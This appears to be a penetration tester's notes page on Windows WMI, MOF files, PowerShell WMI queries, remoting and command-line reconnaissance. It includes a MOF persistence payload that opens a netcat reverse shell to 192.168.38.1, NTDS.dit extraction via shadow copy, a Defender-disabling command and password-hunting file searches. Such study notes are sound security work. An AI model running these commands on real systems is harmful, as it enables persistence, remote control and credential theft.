<h3 id="mof-managed-object-format"><a href="http://msdn.microsoft.com/en-us/library/aa823192%28VS.85%29.aspx">MOF (Managed Object Format)</a><a class="headerlink" href="#mof-managed-object-format" title="Permanent link">&para;</a></h3>
<ul>
<li>Language used to describe CIM classes, namespaces and providers </li>
<li>MOF file needs to be registered into the CIM/WMI repository in order to be taken into account by WMI<ul>
<li>CIM class(es) MOF describes are added into the repository</li>
<li>Stored in <code class="codehilite"><span class="c">%SystemRoot%\System32\wbem</span></code></li>
</ul>
</li>
<li>Compilation<ul>
<li>Compiled using <code class="codehilite"><span class="n">mofcomp</span><span class="p">.</span><span class="n">exe</span></code></li>
</ul>
</li>
<li>Auto compile &amp; register<ul>
<li>Writable to <code class="codehilite"><span class="n">Administrator</span></code> only</li>
<li>Files added to  <code class="codehilite"><span class="c">%SystemRoot%\System32\wbem\mof\</span></code> get auto compiled and registered (before Vista)</li>
<li>Logs are in <code class="codehilite"><span class="c">%SystemRoot%\System32\wbem\mof\Logs\mofcomp.log</span></code></li>
</ul>
</li>
</ul>
<p>Wait for a windows event and trigger:
<div class="codehilite"><pre><span></span><span class="c">#pragma namespace (&quot;\\\\.\\root\\subscription&quot;)</span>

<span class="n">instance</span> <span class="n">of</span> <span class="n">__EventFilter</span> <span class="n">as</span> <span class="nv">$FILTER</span>
<span class="p">{</span>
    <span class="n">Name</span> <span class="p">=</span> <span class="s2">&quot;CLASS_FIRST_TEST&quot;</span><span class="p">;</span>
    <span class="n">EventNamespace</span> <span class="p">=</span> <span class="s2">&quot;root\\cimv2&quot;</span><span class="p">;</span>
 <span class="n">Query</span> <span class="p">=</span> <span class="s2">&quot;SELECT * FROM __InstanceCreationEvent &quot;</span>
  <span class="s2">&quot;WHERE TargetInstance ISA \&quot;</span><span class="n">Win32_NTLogEvent</span><span class="p">\</span><span class="s2">&quot; AND &quot;</span>
  <span class="s2">&quot;TargetInstance.LogFile=\&quot;</span><span class="n">Application</span><span class="p">\</span><span class="s2">&quot;&quot;</span><span class="p">;</span>

    <span class="n">QueryLanguage</span> <span class="p">=</span> <span class="s2">&quot;WQL&quot;</span><span class="p">;</span>
<span class="p">};</span>

<span class="n">instance</span> <span class="n">of</span> <span class="n">ActiveScriptEventConsumer</span> <span class="n">as</span> <span class="nv">$CONSUMER</span>
<span class="p">{</span>
    <span class="n">Name</span> <span class="p">=</span> <span class="s2">&quot;CLASS_FIRST_TEST&quot;</span><span class="p">;</span>
    <span class="n">ScriptingEngine</span> <span class="p">=</span> <span class="s2">&quot;VBScript&quot;</span><span class="p">;</span>

    <span class="n">ScriptText</span> <span class="p">=</span>
      <span class="s2">&quot;Set objShell = CreateObject(\&quot;</span><span class="n">WScript</span><span class="p">.</span><span class="n">Shell</span><span class="p">\</span><span class="s2">&quot;)\n&quot;</span>
   <span class="s2">&quot;objShell.Run \&quot;</span><span class="n">C</span><span class="err">:</span><span class="p">\\</span><span class="n">Windows</span><span class="p">\\</span><span class="n">system32</span><span class="p">\\</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">C</span> <span class="n">C</span><span class="err">:</span><span class="p">\\</span><span class="n">nc</span><span class="p">.</span><span class="n">exe</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">38</span><span class="p">.</span><span class="n">1</span> <span class="n">1337</span> <span class="n">-e</span> <span class="n">C</span><span class="err">:</span><span class="p">\\</span><span class="n">Windows</span><span class="p">\\</span><span class="n">system32</span><span class="p">\\</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span><span class="p">\</span><span class="s2">&quot;\n&quot;</span><span class="p">;</span>
<span class="p">};</span>

<span class="n">instance</span> <span class="n">of</span> <span class="n">__FilterToConsumerBinding</span>
<span class="p">{</span>
    <span class="n">Consumer</span> <span class="p">=</span> <span class="nv">$CONSUMER</span> <span class="p">;</span>
    <span class="k">Filter</span> <span class="p">=</span> <span class="nv">$FILTER</span> <span class="p">;</span>
<span class="p">};</span>
</pre></div></p>
<blockquote>
<ul>
<li>Ref: <a href="http://www.hsc-news.com/archives/2011/000078.html">http://www.hsc-news.com/archives/2011/000078.html</a></li>
</ul>
</blockquote>
<p>Self start:
<div class="codehilite"><pre><span></span><span class="c">#pragma namespace (&quot;\\\\.\\root\\subscription&quot;)</span>

<span class="n">class</span> <span class="n">WoootClass</span>
<span class="p">{</span>
 <span class="no">[key]</span>
 <span class="n">string</span> <span class="n">Name</span><span class="p">;</span>
<span class="p">};</span>

<span class="n">instance</span> <span class="n">of</span> <span class="n">__EventFilter</span> <span class="n">as</span> <span class="nv">$FILTER</span>
<span class="p">{</span>
    <span class="n">Name</span> <span class="p">=</span> <span class="s2">&quot;XPLOIT_TEST_SYSTEM&quot;</span><span class="p">;</span>
    <span class="n">EventNamespace</span> <span class="p">=</span> <span class="s2">&quot;root\\subscription&quot;</span><span class="p">;</span>
 <span class="n">Query</span> <span class="p">=</span> <span class="s2">&quot;SELECT * FROM __InstanceCreationEvent &quot;</span>
         <span class="s2">&quot;WHERE TargetInstance.__class = \&quot;</span><span class="n">WoootClass</span><span class="p">\</span><span class="s2">&quot;&quot;</span><span class="p">;</span>

    <span class="n">QueryLanguage</span> <span class="p">=</span> <span class="s2">&quot;WQL&quot;</span><span class="p">;</span>
<span class="p">};</span>

<span class="n">instance</span> <span class="n">of</span> <span class="n">ActiveScriptEventConsumer</span> <span class="n">as</span> <span class="nv">$CONSUMER</span>
<span class="p">{</span>
    <span class="p">//</span> <span class="p">...</span>     
<span class="p">};</span>

<span class="n">instance</span> <span class="n">of</span> <span class="n">__FilterToConsumerBinding</span>
<span class="p">{</span>
    <span class="p">//</span> <span class="p">...</span>
<span class="p">};</span>

<span class="n">instance</span> <span class="n">of</span> <span class="n">WoootClass</span>
<span class="p">{</span>
 <span class="n">Name</span> <span class="p">=</span> <span class="s2">&quot;Woot&quot;</span><span class="p">;</span>
<span class="p">};</span>
</pre></div></p>
<p><strong>Usages</strong></p>
<p>- Automatically kill some processes as soon as they are launched (anti-rootkits...),
  - Automatically detect when the backdoor/rootkit has been deleted to load it again (dropper),
  - Automatically infect USB devices</p>
<h3 id="exploring">Exploring<a class="headerlink" href="#exploring" title="Permanent link">&para;</a></h3>
<p><strong>Exploring Namespaces</strong></p>
<div class="codehilite"><pre><span></span><span class="nb">Get-WmiObject</span> <span class="n">-Namespace</span> <span class="s2">&quot;root&quot;</span> <span class="n">-Class</span> <span class="s2">&quot;__Namespace&quot;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">name</span>
<span class="nb">Get-CimInstance</span>  <span class="n">-Namespace</span> <span class="s2">&quot;root&quot;</span> <span class="n">-Class</span> <span class="s2">&quot;__Namespace&quot;</span> 
</pre></div>

<p>To read nested namespaces:
<div class="codehilite"><pre><span></span><span class="nb">Get-WmiNamespace</span> 
</pre></div></p>
<p><strong>Exploring Classes</strong></p>
<p><code class="codehilite"><span class="o">-</span><span class="n">Namespace</span> <span class="n">root</span><span class="err">\</span><span class="n">cimv2</span></code> is the default of Powershell</p>
<p><div class="codehilite"><pre><span></span><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="p">*</span><span class="n">bios</span><span class="p">*</span> <span class="n">-List</span> 
</pre></div>
<div class="codehilite"><pre><span></span><span class="nb">Get-CimClasses</span> <span class="n">-List</span> 
</pre></div></p>
<p>List only dynamic classes:
<div class="codehilite"><pre><span></span><span class="nb">Get-CimClasses</span> <span class="n">-QualifierName</span> <span class="n">dynamic</span> <span class="n">-List</span>
</pre></div></p>
<p>Look at details of the class:
<div class="codehilite"><pre><span></span><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">Win32_Bios</span> <span class="p">|</span> <span class="nb">fl </span><span class="p">*</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">Win32_Bios</span> <span class="p">|</span> <span class="nb">fl </span><span class="p">*</span>
</pre></div></p>
<p><strong>Using WMI Class</strong></p>
<p><div class="codehilite"><pre><span></span><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">Win32_Process</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Name</span> <span class="o">-eq</span> <span class="s2">&quot;explorer.exe&quot;</span><span class="p">}</span>

<span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">Win32_Process</span> <span class="p">|</span> <span class="nb">where </span><span class="n">name</span> <span class="o">-eq</span> <span class="s2">&quot;explorer.exe&quot;</span>

<span class="nb">Get-WmiObject</span> <span class="n">-Query</span> <span class="s2">&quot;Select * from Win32_Process where Name = &#39;explorer.exe&#39;&quot;</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">Win32_Process</span> <span class="n">-Filter</span> <span class="s2">&quot;Name -eq &#39;explorer.exe&#39;&quot;</span>

<span class="nb">Get-CimInstance</span> <span class="n">-Query</span> <span class="s2">&quot;Select * from Win32_Process where Name = &#39;explorer.exe&#39;&quot;</span>
</pre></div></p>
<p>Can use <code class="codehilite"><span class="n">Remove</span><span class="o">-</span><span class="n">WmiObject</span></code> and <code class="codehilite"><span class="n">Remove</span><span class="o">-</span><span class="n">CimInstance</span></code> to close processed, remove registry entries, etc. </p>
<p><strong>Methods</strong></p>
<p>Identifying methods:
<div class="codehilite"><pre><span></span><span class="nb">Get-WmiObject</span> <span class="p">*</span> <span class="n">-List</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Method</span><span class="p">}</span>
<span class="p">(</span><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">Win32_Process</span> <span class="n">-List</span><span class="p">).</span><span class="n">Methods</span> 
<span class="nb">Get-CimClass</span> <span class="n">-Class</span> <span class="n">Win32_Process</span> <span class="n">-List</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">-ExpandProperty</span> <span class="n">Methods</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="nb">Get-CimClass</span> <span class="n">-MethodName</span> <span class="p">*</span> 
<span class="nb">Get-CimClass</span> <span class="n">-MethodName</span> <span class="p">*</span><span class="n">create</span><span class="p">*</span>
<span class="nb">Get-CimClass</span> <span class="n">-ClassName</span> <span class="n">Win32_Process</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">-ExpandProperty</span> <span class="n">CimClassMethods</span>
</pre></div></p>
<p>Exploring methods:
<div class="codehilite"><pre><span></span><span class="nb">Get-CimClass</span> <span class="n">-ClassName</span> <span class="n">Win32_Process</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">-ExpandProperty</span> <span class="n">CimClassMethods</span> <span class="p">|</span> <span class="nb">where </span><span class="n">name</span> <span class="o">-eq</span> <span class="s2">&quot;Create&quot;</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">-ExpandProperty</span> <span class="n">Parameters</span>
</pre></div></p>
<p>Invoke:
<div class="codehilite"><pre><span></span><span class="nb">Invoke-WmiMethod</span> <span class="n">-Class</span> <span class="n">Win32_process</span> <span class="n">-Name</span> <span class="n">create</span> <span class="n">-ArgumentList</span> <span class="n">calc</span><span class="p">.</span><span class="n">exe</span>
</pre></div>
<div class="codehilite"><pre><span></span><span class="nb">Invoke-CimMethod</span> <span class="n">-ClassName</span> <span class="n">Win32_process</span> <span class="n">-MethodName</span> <span class="n">Create</span> <span class="n">-Arguments</span> <span class="p">@{</span><span class="n">CommandLine</span> <span class="p">=</span> <span class="s2">&quot;calc.exe&quot;</span><span class="p">}</span>
</pre></div></p>
<p><strong>Update Instance</strong></p>
<div class="codehilite"><pre><span></span><span class="nb">Get-WritableProperties</span> 
</pre></div>

<div class="codehilite"><pre><span></span><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">Win32_Printer</span> <span class="n">-FIlter</span> <span class="s2">&quot;name = &#39;Microsoft XPS Document Writer&#39;&quot;</span> <span class="p">|</span> <span class="nb">Set-WmiInstance</span> <span class="n">-Arguments</span> <span class="p">@{</span><span class="n">Comment</span> <span class="p">=</span> <span class="s2">&quot;Example comment&quot;</span><span class="p">}</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="nb">Get-CimInstancet</span> <span class="n">-ClassName</span> <span class="n">Win32_Printer</span> <span class="n">-FIlter</span> <span class="s2">&quot;name = &#39;Microsoft XPS Document Writer&#39;&quot;</span> <span class="p">|</span> <span class="nb">Set-CimInstance</span> <span class="n">-Property</span> <span class="p">@{</span><span class="n">Comment</span> <span class="p">=</span> <span class="s2">&quot;Example comment&quot;</span><span class="p">}</span>
</pre></div>

<p><strong>Associations</strong></p>
<blockquote>
<p><a href="https://github.com/dfinke/images/blob/master/acn.png">https://github.com/dfinke/images/blob/master/acn.png</a></p>
</blockquote>
<p><img alt="acn.png" src="_assets/acn.png" /></p>
<div class="codehilite"><pre><span></span><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="p">*</span><span class="n">Win32_NetworkAdapter</span><span class="p">*</span> <span class="n">-List</span> <span class="p">|</span> <span class="nb">fl </span><span class="p">*</span>
<span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">Win32_NetworkAdapter</span> <span class="n">-List</span> <span class="p">|</span> <span class="nb">fl </span><span class="p">*</span>

<span class="nb">Get-WmiObject</span> <span class="n">-Query</span> <span class="s2">&quot;Associators of {win32_NetworkAdapter.DeviceID=11}&quot;</span>
<span class="nb">Get-WmiObject</span> <span class="n">-Query</span> <span class="s2">&quot;Associators of {win32_NetworkAdapter.DeviceID=11} Where ClassDefsOnly&quot;</span>

<span class="nb">Get-CimAssociatedInstance</span> <span class="n">-InputObject</span> <span class="p">(</span><span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">Win32_NetworkAdapter</span> <span class="n">-Filter</span> <span class="s1">&#39;DeviceId = 11&#39;</span><span class="p">)</span>
</pre></div>

<p>Only see one association class: 
<div class="codehilite"><pre><span></span><span class="nb">Get-WmiObject</span> <span class="n">-Query</span> <span class="s2">&quot;Associators of {win32_NetworkAdapter.DeviceID=11}&quot;</span> <span class="n">-AssociationClass</span> <span class="n">Win32_ProtocolBinding</span> 
</pre></div></p>
<p>Get references (classes linking two other classes)
<div class="codehilite"><pre><span></span><span class="nb">Get-WimObject</span> <span class="n">-Query</span> <span class="s2">&quot;References of {win32_NetworkAdapter.DeviceID=11} Where ClassDefsOnly&quot;</span>
<span class="nb">Get-WimObject</span> <span class="n">-Query</span> <span class="s2">&quot;References of {win32_NetworkAdapter.DeviceID=11}&quot;</span> 
</pre></div></p>
<h3 id="interesting-queries">Interesting Queries<a class="headerlink" href="#interesting-queries" title="Permanent link">&para;</a></h3>
<ul>
<li>List all the systems within the current environment/directory:  <code class="codehilite"><span class="k">SELECT</span> <span class="n">ds_cn</span> <span class="k">FROM</span> <span class="n">ds_computer</span></code></li>
<li>Installed software: </li>
<li>File listing:</li>
<li>Services:</li>
<li>Logon accounts:</li>
<li>Hardware information:</li>
<li>Installed patches:</li>
<li>Security logs:</li>
<li>Command line used to start processes: </li>
<li>Path to executable for running processes: </li>
</ul>
<h3 id="useful-wmi-classes">Useful WMI Classes<a class="headerlink" href="#useful-wmi-classes" title="Permanent link">&para;</a></h3>
<ul>
<li>Win32_OperatingSystem</li>
<li>Win32_Process</li>
<li>Win32_IP4RouteTable</li>
<li>Win32_UserAccount</li>
<li>Win32_Groups</li>
<li>Win32_ShadowCopy<ul>
<li>Create a shadow copy of AD's drive and extract NTDS.dit</li>
<li><code class="codehilite"><span class="p">(</span><span class="k">Get</span><span class="o">-</span><span class="n">WmiObject</span> <span class="o">-</span><span class="k">Class</span> <span class="n">Win32_ShadowCopy</span> <span class="o">-</span><span class="n">list</span><span class="p">).</span><span class="k">create</span><span class="p">(</span><span class="ss">&quot;C:\&quot;</span><span class="p">,</span> <span class="ss">&quot;CreateAccessible&quot;</span><span class="p">)</span><span class="err">$</span><span class="n">link</span> <span class="o">=</span> <span class="p">(</span><span class="k">Get</span><span class="o">-</span><span class="n">WmiObject</span> <span class="o">-</span><span class="k">Class</span> <span class="n">Winn32_ShadowCopy</span><span class="p">).</span><span class="n">DeviceObject</span> <span class="o">+</span> <span class="ss">&quot;\&quot;</span><span class="n">cmd</span> <span class="o">/</span><span class="k">c</span> <span class="n">mklink</span> <span class="o">/</span><span class="n">d</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">shadowcopy</span> <span class="ss">&quot;$link&quot;</span></code></li>
</ul>
</li>
<li>AD</li>
</ul>
<h3 id="tools_1">Tools<a class="headerlink" href="#tools_1" title="Permanent link">&para;</a></h3>
<ul>
<li>WMI Object Browser:</li>
<li>WMIC</li>
</ul>
<div class="codehilite"><pre><span></span><span class="c"># WMIC Verbs can be explored by looking at help </span>

<span class="c"># Interactive </span>
<span class="n">wmic</span> 
<span class="n">wmic</span><span class="err">:</span><span class="n">root</span><span class="p">\</span><span class="n">cli</span><span class="p">&gt;</span> <span class="k">process</span> <span class="p">/?</span>
<span class="n">wmic</span><span class="err">:</span><span class="n">root</span><span class="p">\</span><span class="n">cli</span><span class="p">&gt;</span> <span class="nb">group where </span><span class="n">name</span><span class="p">=</span><span class="s1">&#39;Administrators&#39;</span> <span class="n">assoc</span>

<span class="c"># Non-interactive </span>
<span class="n">wmic</span> <span class="k">process</span> <span class="p">/?</span>
</pre></div>

<ul>
<li>Powershell WMI Browser</li>
<li>WMI Code Generator </li>
<li>WMIGen</li>
</ul>
<h3 id="remoting">Remoting<a class="headerlink" href="#remoting" title="Permanent link">&para;</a></h3>
<ul>
<li>WMI Cmdlets  <ul>
<li>Uses DCOM </li>
<li>Port 135 (winmgmt service)</li>
<li>Not firewall / NAT friendly </li>
<li>Data exchanged on dynamic ports (<code class="codehilite"><span class="n">HKLM</span><span class="err">\</span><span class="n">Software</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Rpc</span><span class="err">\</span><span class="n">Internet</span></code>)</li>
</ul>
</li>
<li>CIM Cmdlets <ul>
<li>DCOM 135</li>
<li>WinRm/WSMan<ul>
<li>5385 - HTTP</li>
<li>5386 - HTTPS</li>
<li>Firewall and NAT friendly </li>
</ul>
</li>
</ul>
</li>
</ul>
<p>Session over WinRM/WSMan:
<div class="codehilite"><pre><span></span><span class="nv">$sess</span> <span class="p">=</span> <span class="nb">New-CimSession</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">name</span><span class="p">&gt;</span> <span class="n">-Credential</span> <span class="p">&lt;</span><span class="n">cred</span><span class="p">&gt;</span>
<span class="nb">Get-CimInstance</span> <span class="n">-CimSession</span> <span class="nv">$sess</span> <span class="n">-ClassName</span> <span class="n">Win32_OperatingSystem</span>
</pre></div></p>
<p>Session over DCOM:
<div class="codehilite"><pre><span></span><span class="nv">$sessOptions</span> <span class="p">=</span> <span class="nb">New-CimSessionOption</span> <span class="n">-Protocol</span> <span class="n">Dcom</span>
<span class="nv">$newsess</span> <span class="p">=</span> <span class="nb">New-CimSession</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">name</span><span class="p">&gt;</span> <span class="n">-Credential</span> <span class="p">&lt;</span><span class="n">cred</span><span class="p">&gt;</span> <span class="n">-SessionOption</span> <span class="nv">$sessOptions</span>
</pre></div></p>
<h3 id="access-registry">Access Registry<a class="headerlink" href="#access-registry" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="nb">Get-WimObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="k">default</span> <span class="n">-Class</span> <span class="n">StdRegProv</span> <span class="n">-List</span>

<span class="nb">Get-WimObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="k">default</span> <span class="n">-Class</span> <span class="n">StdRegProv</span> <span class="n">-List</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">methods</span> <span class="p">|</span> <span class="n">more</span>

<span class="nv">$RegProv</span> <span class="p">=</span> <span class="nb">Get-WimObject</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="k">default</span> <span class="n">-Class</span> <span class="n">StdRegProv</span> <span class="n">-List</span> 
<span class="nv">$RegProv</span><span class="p">.</span><span class="n">Methods</span> 
</pre></div>

<div class="codehilite"><pre><span></span><span class="nv">$RemoteReg</span> <span class="p">=</span> <span class="nb">Get-WmiObject</span> <span class="n">-List</span> <span class="s2">&quot;StdRegProv&quot;</span> <span class="n">-ComputerName</span> <span class="p">&lt;</span><span class="n">name</span><span class="p">&gt;</span> <span class="n">-Credential</span> <span class="p">&lt;</span><span class="n">cred</span><span class="p">&gt;</span>
<span class="nv">$RemoteReg</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">methods</span> <span class="p">|</span> <span class="n">more</span>
<span class="nv">$RemoteReg</span><span class="p">.</span><span class="n">getStringValue</span><span class="p">(&lt;</span><span class="n">id</span><span class="p">&gt;,</span> <span class="p">&lt;</span><span class="n">path</span><span class="p">&gt;,</span> <span class="p">&lt;</span><span class="n">propertyName</span><span class="p">&gt;)</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="n">WmiInvokeMethod</span> <span class="n">-Namespace</span> <span class="n">root</span><span class="p">\</span><span class="k">default</span> <span class="n">-Class</span> <span class="n">StdRegProv</span> <span class="n">-Name</span> <span class="n">GetStringValue</span> <span class="p">@(&lt;</span><span class="n">id</span><span class="p">&gt;,&lt;</span><span class="n">path</span><span class="p">&gt;,&lt;</span><span class="n">property</span><span class="p">&gt;)</span>
</pre></div>

<div class="codehilite"><pre><span></span><span class="n">Posh_SecMod</span> <span class="p">\</span> <span class="n">Registry</span><span class="p">.</span><span class="n">ps1</span> 
</pre></div>

<h3 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html">Playing with MOF files on Windows, for fun &amp; profit</a></li>
<li><a href="https://sites.google.com/site/beyondexcel/project-updates/exposingsystemsecretswithvbaandwmiapi">Exposing System Secrets with VBA and WMI API</a></li>
<li><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-WbemExec-for-a-write-privilege-attack-on-Windows">How to use WbemExec for a write privilege attack on Windows</a></li>
</ul>
<h2 id="applocker">AppLocker<a class="headerlink" href="#applocker" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="https://github.com/api0cradle/UltimateAppLockerByPassList">https://github.com/api0cradle/UltimateAppLockerByPassList</a></li>
</ul>
<h2 id="hyperv">HyperV<a class="headerlink" href="#hyperv" title="Permanent link">&para;</a></h2>
<ul>
<li>Fuzzing para-virtualized devices in Hyper-V: <a href="https://blogs.technet.microsoft.com/srd/2019/01/28/fuzzing-para-virtualized-devices-in-hyper-v/">https://blogs.technet.microsoft.com/srd/2019/01/28/fuzzing-para-virtualized-devices-in-hyper-v/</a></li>
<li>Writing a Hyper-V "Bridge" for Fuzzing — Part 1: WDF: <a href="http://www.alex-ionescu.com/?p=377">http://www.alex-ionescu.com/?p=377</a></li>
<li>Writing a Hyper-V "Bridge" for Fuzzing — Part 2 : Hypercalls &amp; MDLs: <a href="http://www.alex-ionescu.com/?p=471">http://www.alex-ionescu.com/?p=471</a></li>
<li><a href="https://blogs.technet.microsoft.com/srd/2018/12/10/first-steps-in-hyper-v-research/">https://blogs.technet.microsoft.com/srd/2018/12/10/first-steps-in-hyper-v-research/</a></li>
<li><a href="https://blogs.technet.microsoft.com/srd/2018/05/03/hyper-v-debugging-symbols-are-publicly-available/">https://blogs.technet.microsoft.com/srd/2018/05/03/hyper-v-debugging-symbols-are-publicly-available/</a></li>
<li><a href="https://github.com/comaeio/LiveCloudKd">https://github.com/comaeio/LiveCloudKd</a></li>
</ul>
<h2 id="events">Events<a class="headerlink" href="#events" title="Permanent link">&para;</a></h2>
<p><strong>Tools</strong></p>
<ul>
<li>EtwExplorer - View Event Tracing for Windows (ETW) Provider manifests: <a href="https://github.com/zodiacon/EtwExplorer">https://github.com/zodiacon/EtwExplorer</a></li>
</ul>
<h2 id="defense">Defense<a class="headerlink" href="#defense" title="Permanent link">&para;</a></h2>
<ul>
<li>Disable Windows Defender: <code class="codehilite"><span class="k">Set</span><span class="o">-</span><span class="n">MpPreference</span> <span class="o">-</span><span class="n">DisableRealtimeMonitoring</span> <span class="err">$</span><span class="k">true</span></code></li>
<li>Windows 10 and Server 2016 Secure Baseline Group Policy: <a href="https://github.com/mxk/win10-secure-baseline-gpo">https://github.com/mxk/win10-secure-baseline-gpo</a></li>
<li>Preventing Mimikatz Attacks by Panagiotis Gkatziroulis: <a href="https://hakin9.org/preventing-mimikatz-attacks/">https://hakin9.org/preventing-mimikatz-attacks/</a></li>
<li>Server Security<ul>
<li><a href="https://docs.microsoft.com/en-us/windows-server/security/security-and-assurance">https://docs.microsoft.com/en-us/windows-server/security/security-and-assurance</a></li>
</ul>
</li>
</ul>
<h2 id="references_1">References<a class="headerlink" href="#references_1" title="Permanent link">&para;</a></h2>
<ul>
<li>Schtasks without Schtasks.exe via Reflective DLL: <a href="https://ijustwannared.team/2018/08/13/schtasks-without-schtasks-exe-via-reflective-dll/">https://ijustwannared.team/2018/08/13/schtasks-without-schtasks-exe-via-reflective-dll/</a></li>
<li>Windows 10 Persistence via PATH directories - CDPSvc: <a href="https://www.a12d404.net/windows/2019/01/13/persistance-via-path-directories.html">https://www.a12d404.net/windows/2019/01/13/persistance-via-path-directories.html</a><ul>
<li>CDPSvc (Connected Devices Platform Service) searches the file cdpsgshims.dll inside PATH directories and loads it if found.</li>
<li>With a default Windows installation, there can’t be a non-admin directory in the PATH, so this can’t be exploited.</li>
<li>A sample DLL (source included) that executes calc.exe is available here: <a href="https://github.com/marpie/a12d404.net-files/tree/master/CDPSvcPersist">https://github.com/marpie/a12d404.net-files/tree/master/CDPSvcPersist</a></li>
</ul>
</li>
<li>Useful for vulnerability research workflows on Windows: <a href="https://gist.github.com/jthuraisamy/af862987fff437daec52ee3cc5894203">https://gist.github.com/jthuraisamy/af862987fff437daec52ee3cc5894203</a></li>
<li>Windows 10 Device Security: <a href="https://query.prod.cms.rt.microsoft.com/cms/api/am/binary/RE2IIVu">https://query.prod.cms.rt.microsoft.com/cms/api/am/binary/RE2IIVu</a></li>
<li>Windows Command Line cheatsheet (part 1): some useful tips: <a href="https://www.andreafortuna.org/technology/windows/windows-command-line-cheatsheet-part-1-some-useful-tips/">https://www.andreafortuna.org/technology/windows/windows-command-line-cheatsheet-part-1-some-useful-tips/</a></li>
<li>Windows Command Line cheatsheet (part 2): WMIC: <a href="https://www.andreafortuna.org/dfir/windows-command-line-cheatsheet-part-2-wmic/">https://www.andreafortuna.org/dfir/windows-command-line-cheatsheet-part-2-wmic/</a></li>
</ul>
<h3 id="kernel">Kernel<a class="headerlink" href="#kernel" title="Permanent link">&para;</a></h3>
<ul>
<li>Kernel Internals - Windows Sandbox: <a href="https://techcommunity.microsoft.com/t5/Windows-Kernel-Internals/Windows-Sandbox/ba-p/301849">https://techcommunity.microsoft.com/t5/Windows-Kernel-Internals/Windows-Sandbox/ba-p/301849</a></li>
</ul>
<h3 id="random">Random<a class="headerlink" href="#random" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span>WINDOWS COMMANDS

BASIC
systeminfo
hostname
whoami
whoami /all
<span class="k">echo</span> <span class="nv">%username%</span>
ipconfig /all
route print
netstat -ntlp
    -listening ports
netstat -bano
netsat -r
    -routing table
command <span class="p">|</span> findstr /C:<span class="s2">&quot;str&quot;</span>
    -grep
<span class="k">echo</span> <span class="nv">%userdomain%</span>
<span class="k">echo</span> <span class="nv">%path%</span>
shutdown /r
<span class="k">start</span> explorer
    -execute path builtin program (same as input to win+r)
env
<span class="k">set</span>
<span class="k">path</span>
    -print currently defined execution path
setx c:\Program Files(x86)\bin\
    -append target directory to currently defined execution path
runas /profile /user:administrator <span class="s2">&quot;C:\absolute\path\pcoff.exe&quot;</span>
    -run target <span class="s2">&quot;executable&quot;</span> with user profile permissiosn for /user:
        --*should prompt for target user&#39;s password
<span class="k">START</span> /B process.exe
    run code excution in background
<span class="k">for</span> <span class="se">%%</span>i <span class="k">in</span> <span class="p">(</span>C:\abs\path\*<span class="p">)</span> <span class="k">do</span> <span class="se">%%</span>i
    OR
<span class="k">for</span> <span class="k">/F</span> <span class="s2">&quot;usebackq&quot;</span> %i <span class="k">in</span> <span class="p">(</span><span class="sb">`dir /b C:\macros\Day\`</span><span class="p">)</span> <span class="k">DO</span> %i
    -execute all files in a directory
Auto-Start Directories
Windows NT 6.1,6.0
<span class="nv">%SystemDrive%</span>\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\
Windows NT 5.2, 5.1, 5,0
<span class="nv">%SystemDrive%</span>\Documents And Settings\All Users\Start Menu\Programs\StartUp\
Windows 9x
<span class="nv">%SystemDrive%</span>\wmiOWS\Start Menu\Programs\StartUp\
Windows NT 4.0, 3.51, 3.50
<span class="nv">%SystemDrive%</span>\WINNT\Profiles\All Users\Start Menu\Programs\StartUp\

FILESYSTEM
<span class="k">type</span> file
    -print file
<span class="k">dir</span> /s *pass* == *cred* == *vnc* == *.config*
<span class="k">dir</span> \ /s /b <span class="p">|</span> find /I “searchstring”
findstr /si password *.xml *.ini *.txt
fsutil fsinfo drives
    -list drives currently on the system
    --requires admin privs
<span class="k">assoc</span>
    -print returned list of file extension associations
<span class="k">assoc</span> .ps1=powershellfile
